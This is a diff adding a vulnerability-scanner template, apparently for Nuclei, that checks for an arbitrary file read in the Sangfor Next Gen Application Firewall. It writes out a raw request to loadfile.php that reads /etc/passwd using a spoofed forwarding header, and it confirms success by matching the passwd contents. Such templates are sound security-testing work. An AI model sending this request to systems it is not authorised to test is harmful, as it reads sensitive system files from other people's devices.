@@ -1,0 +1,32 @@
+id: sangfor-nextgen-lfi
+
+info:
+  name: Sangfor Next Gen Application Firewall - Arbitary File Read
+  author: sangfor
+  severity: high
+  tags: sangfor,lfi
+
+http:
+  - raw:
+      - |
+        GET /svpn_html/loadfile.php?file=/etc/./passwd HTTP/1.1
+        Host: {{Hostname}}
+        y-forwarded-for: 127.0.0.1
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:[x*]:0:0"
+
+      - type: word
+        part: header
+        words:
+          - 'filename="passwd"'
+          - 'application/octet-stream'
+        condition: and
+
+      - type: status
+        status:
+          - 200
